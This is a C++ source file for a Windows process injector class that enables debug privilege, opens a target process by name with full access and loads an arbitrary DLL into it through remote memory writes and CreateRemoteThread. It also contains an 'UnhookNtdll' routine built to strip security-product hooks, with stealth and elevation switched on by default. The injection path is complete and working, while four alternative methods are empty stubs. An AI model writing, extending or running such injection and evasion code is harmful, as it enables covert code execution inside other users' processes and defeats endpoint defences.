// process_injector.cpp
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>

namespace ProcessInjector {

    struct InjectConfig {
        DWORD processId;
        std::wstring processName;
        std::wstring dllPath;
        bool stealthMode;
        bool elevatePrivileges;
        bool unhookNtdll;
        DWORD injectMethod;
    };

    class Injector {
    private:
        InjectConfig m_config;
        bool m_success;

        bool EnableDebugPrivilege() {
            HANDLE hToken;
            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
                return false;

            LUID luid;
            if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid)) {
                CloseHandle(hToken);
                return false;
            }

            TOKEN_PRIVILEGES tp = { 1, { luid, SE_PRIVILEGE_ENABLED } };
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
            CloseHandle(hToken);
            return GetLastError() == ERROR_SUCCESS;
        }

        DWORD FindProcessByName(const std::wstring& name) {
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(hSnapshot, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, name.c_str()) == 0) {
                        CloseHandle(hSnapshot);
                        return pe.th32ProcessID;
                    }
                } while (Process32NextW(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);
            return 0;
        }

        bool InjectViaLoadLibrary(HANDLE hProcess, const std::wstring& dllPath) {
            size_t pathSize = (dllPath.length() + 1) * sizeof(wchar_t);
            LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!remoteMem) return false;

            if (!WriteProcessMemory(hProcess, remoteMem, dllPath.c_str(), pathSize, NULL)) {
                VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
                return false;
            }

            LPTHREAD_START_ROUTINE loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, loadLibrary, remoteMem, 0, NULL);
            if (!hThread) {
                VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
                return false;
            }

            WaitForSingleObject(hThread, INFINITE);
            VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hThread);
            return true;
        }

        bool InjectViaManualMap(HANDLE hProcess, const std::wstring& dllPath) {
            // Placeholder for manual mapping
            return false;
        }

        bool InjectViaThreadHijack(HANDLE hProcess, const std::wstring& dllPath) {
            // Placeholder for thread hijacking
            return false;
        }

        bool InjectViaAPC(HANDLE hProcess, const std::wstring& dllPath) {
            // Placeholder for APC injection
            return false;
        }

        bool InjectViaSetWindowsHook(HANDLE hProcess, const std::wstring& dllPath) {
            // Placeholder for windows hook injection
            return false;
        }

        bool UnhookNtdll(HANDLE hProcess) {
            HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
            if (!hNtdll) return false;

            BYTE* pNtdll = (BYTE*)hNtdll;
            IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)pNtdll;
            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(pNtdll + dosHeader->e_lfanew);
            IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders);

            for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
                if (memcmp(section->Name, ".text", 5) == 0) {
                    DWORD oldProtect;
                    VirtualProtectEx(hProcess, pNtdll + section->VirtualAddress, section->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);

                    BYTE* originalNtdll = (BYTE*)LoadLibraryExW(L"ntdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
                    if (originalNtdll) {
                        memcpy(pNtdll + section->VirtualAddress, originalNtdll + section->VirtualAddress, section->Misc.VirtualSize);
                        FreeLibrary((HMODULE)originalNtdll);
                    }

                    VirtualProtectEx(hProcess, pNtdll + section->VirtualAddress, section->Misc.VirtualSize, oldProtect, &oldProtect);
                    return true;
                }
            }
            return false;
        }

    public:
        Injector() : m_success(false) {
            ZeroMemory(&m_config, sizeof(m_config));
            m_config.injectMethod = 1;
            m_config.stealthMode = true;
            m_config.elevatePrivileges = true;
            m_config.unhookNtdll = true;
        }

        void SetProcessId(DWORD pid) { m_config.processId = pid; }
        void SetProcessName(const std::wstring& name) { m_config.processName = name; }
        void SetDllPath(const std::wstring& path) { m_config.dllPath = path; }
        void SetMethod(DWORD method) { m_config.injectMethod = method; }

        bool Inject() {
            if (m_config.elevatePrivileges)
                EnableDebugPrivilege();

            DWORD pid = m_config.processId;
            if (pid == 0 && !m_config.processName.empty())
                pid = FindProcessByName(m_config.processName);

            if (pid == 0) return false;

            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            if (!hProcess) return false;

            if (m_config.unhookNtdll)
                UnhookNtdll(hProcess);

            bool result = false;
            switch (m_config.injectMethod) {
                case 1: result = InjectViaLoadLibrary(hProcess, m_config.dllPath); break;
                case 2: result = InjectViaManualMap(hProcess, m_config.dllPath); break;
                case 3: result = InjectViaThreadHijack(hProcess, m_config.dllPath); break;
                case 4: result = InjectViaAPC(hProcess, m_config.dllPath); break;
                case 5: result = InjectViaSetWindowsHook(hProcess, m_config.dllPath); break;
            }

            CloseHandle(hProcess);
            m_success = result;
            return result;
        }

        bool IsSuccessful() { return m_success; }
    };
}
